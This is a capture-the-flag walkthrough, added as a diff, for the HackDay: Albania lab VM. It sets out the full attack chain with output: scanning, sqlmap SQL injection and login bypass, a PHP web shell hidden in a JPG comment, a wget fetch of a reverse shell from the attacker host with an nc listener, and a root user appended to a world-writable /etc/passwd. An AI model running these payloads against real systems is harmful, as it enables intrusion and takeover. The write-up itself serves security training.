@@ -1,0 +1,149 @@
+# HackDay: Albania
+
+1. First we need to know the IP
+$ netdiscover -i eth1 -r 192.168.99.100/24
+Currently scanning: 192.168.99.0/24   |   Screen View: Unique Hosts
+
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.99.100  08:00:27:98:0d:5f      1      60  Cadmus Computer Systems
+
+2. Nmap Scan
+$ nmap -A -sS -T4 -p- 192.168.99.100
+Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-25 21:57 CET
+Nmap scan report for 192.168.99.100
+Host is up (0.00030s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)
+|_  256 21:fe:63:45:2c:cb:a1:f1:b6:ba:36:dd:ed:d3:d9:48 (ECDSA)
+8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 26 disallowed entries (15 shown)
+| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/
+| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/
+| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/
+|_/unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: HackDay Albania 2016
+MAC Address: 08:00:27:98:0D:5F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.30 ms 192.168.99.100
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
+
+3. Open http://192.168.99.100:8008/robots.txt and find that /unisxcudkqjydw show this:
+IS there any /vulnbank/ in there ???
+
+4. Try http://192.168.99.100:8008/unisxcudkqjydw/vulnbank/client
+5. Found a login form and try sqlmap:
+$ sqlmap -u "http://192.168.99.100:8008/unisxcudkqjydw/vulnbank/client/login.php" --data "username=*&password=admin"
+       ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.0.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 22:00:33
+
+custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n/q] Y
+[22:00:48] [INFO] resuming back-end DBMS 'mysql'
+[22:00:48] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* ((custom) POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 RLIKE time-based blind
+    Payload: username=' RLIKE SLEEP(5)-- tAlU&password=admin
+---
+[22:00:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.04 (xenial)
+web application technology: Apache 2.4.18, PHP 7.0.8
+back-end DBMS: MySQL >= 5.0.12
+[22:00:48] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.99.100'
+
+[*] shutting down at 22:00:48
+
+6. bypass login form with user = "' LIKE 1-- a"
+7. Create jpg with php cmd comment: exiftool -comment="<?php system(\$_GET['cmd']) ?>" sample.jpg
+8. Upload this jpg on creating ticket
+9. Include this images with http://192.168.99.100:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=sample.jpg&cmd=id
+10. Download from server php-reverse-shell
+(attacker) $ python -m SimpleHTTPServer
+http://192.168.99.100:8008/unisxcudkqjydw/vulnbank/client/view_file.php?filename=sample.jpg&cmd=wget%20-Pupload%20192.168.99.100:8000/php-reverse-shell.php
+11. Launch reverse shell
+(attacker) nc -lvvp 9999
+http://192.168.99.100:8008/unisxcudkqjydw/vulnbank/client/upload/php-reverse-shell.php
+192.168.99.100: inverse host lookup failed: Unknown host
+connect to [192.168.99.101] from (UNKNOWN) [192.168.99.100] 52194
+Linux hackday 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 22:08:25 up  3:05,  0 users,  load average: 0.09, 0.10, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+12. Find seuid files (nothing)
+$ find / -perm -4000 2> /dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/ubuntu-core-launcher
+/usr/bin/pkexec
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/newgrp
+/bin/su
+/bin/ping6
+/bin/mount
+/bin/ntfs-3g
+/bin/umount
+/bin/ping
+/bin/fusermount
+
+13. Find word writable files
+$ find / -perm -o+w -type f 2> /dev/null
+/etc/passwd
+/var/crash/.lock
+/var/crash/typescript
+/proc/sys/kernel/ns_last_pid
+/proc/1/task/1/attr/current
+/proc/1/task/1/attr/exec
+/proc/1/task/1/attr/fscreate
+...
+14. /etc/passwd is world writable!!!!
+15. Create root user :D
+$ echo "toor:$1$1MxxsZAs$eH5i2t0ZoUcrgXib2gPgz0:0:0:Taviso,,,:/root:/bin/bash" >> /etc/passwd
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$ su - toor
+root@hackday:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@hackday:~# cat /root/flag.txt
+Urime,
+Tani nis raportin!
+
+d5ed38fdbf28bc4e58be142cf5a17cf5
